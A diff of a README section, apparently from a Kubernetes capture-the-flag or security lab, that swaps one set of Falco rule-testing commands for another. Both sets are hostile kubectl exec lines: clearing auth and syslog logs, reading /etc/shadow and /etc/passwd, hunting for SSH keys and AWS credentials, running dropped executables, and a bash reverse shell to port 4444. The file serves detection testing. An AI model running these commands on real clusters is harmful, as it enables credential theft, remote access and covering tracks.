@@ -211,13 +211,9 @@ kubectl apply -f deployment7.yaml
 
 ## Falco rule testing
 ```
-kubectl exec -it -n flag7 ctf-vulnerable-app-74577b6bb9-vgmzq -- sh -c "cat /dev/null > /var/log/auth.log"
-kubectl exec -it -n flag7 --selector=app=ctf-app -- cat /etc/shadow
-kubectl exec -it -n google --selector=app=frontend -- sh -c "cat /dev/null > /var/log/syslog"
-kubectl exec -it -n google --selector=app=checkoutservice -- sh -c "cp /bin/ls /dev/shm/malicious_exec; /dev/shm/malicious_exec"
-kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- find / -name id_rsa
-kubectl exec -it -n google --selector=app=productcatalogservice -- find / -name .aws/credentials
-kubectl exec -it -n flag7 --selector=app=ctf-app -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-kubectl exec -it -n google --selector=app=cartservice -- curl -k https://kubernetes.default.svc.cluster.local/version
-kubectl exec -it -n flag7 --selector=app=ctf-app -- /bin/bash
+kubectl exec -it developer-test-pod -n default -- sh -c "echo '#!/bin/sh' > /tmp/malicious.sh && echo 'echo \"I am a new executable!\"' >> /tmp/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh"
+kubectl exec -it developer-test-pod -n default -- sh -c 'find / -name "id_rsa" 2>/dev/null'
+kubectl exec -it developer-test-pod -n default -- sh -c 'bash -i >& /dev/tcp/10.1.2.3/4444 0>&1'
+kubectl exec -it developer-test-pod -n default -- touch /var/log/auth.log
+kubectl exec -it developer-test-pod -n default -- cat /usr/bin/../..//etc/passwd
 ```
